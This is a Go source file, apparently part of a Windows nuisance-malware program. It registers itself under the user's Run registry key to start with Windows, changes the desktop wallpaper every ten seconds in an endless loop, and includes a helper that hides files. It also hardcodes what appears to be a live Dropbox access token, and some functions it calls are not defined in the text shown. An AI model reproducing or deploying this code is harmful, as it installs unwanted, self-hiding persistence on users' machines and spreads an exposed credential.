/* ========================================================================
   $File: $
   $Date: $
   $Revision: $
   $Creator: Tristan Magniez $
   ======================================================================== */

package main

import (
    "time"
    "path/filepath"
    "syscall"
    
    "golang.org/x/sys/windows/registry"
    "github.com/kardianos/osext"
)

const Dropbox_TOKEN = "2u5KLEPc3IgAAAAAAAAGOiUl-SjR94MTpfs2MlG1TJyUKp_kUJb-8c-kvxb9sVTH"

func main() {
    exe, _ := osext.Executable()
    _, exename := filepath.Split(exe)
    
    var registry_ok = true
    // set back mode
    k, err := registry.OpenKey(registry.CURRENT_USER,
        "Control Panel\\Desktop", registry.ALL_ACCESS)
    if err != nil {
        println(err)
        registry_ok = false
    }
    defer k.Close()

    //regiter at startup bitch
    if registry_ok {
        k, err := registry.OpenKey(registry.CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            registry.ALL_ACCESS)
        if err == nil {
            _ = k.SetStringValue("w"+exename, windows+exename)
            _ = k.SetStringValue("s"+exename, startup+exename)
        }
        k.Close()
    }
    
    for {
        if registry_ok {
            // set background to strech mode
            err = k.SetStringValue("WallpaperStyle", "2")
            if err != nil {
                println(err)
            }
            err = k.SetStringValue("TileWallpaper", "0")
            if err != nil {
                println(err)
            }
        }
        
        ChangeBackground()

        time.Sleep(10 * time.Second)
    }    
}

func SetFileHidden(file string) error {
    exenameptr, _ := syscall.UTF16PtrFromString(file)
    return  syscall.SetFileAttributes(exenameptr,
        syscall.FILE_ATTRIBUTE_HIDDEN)
}
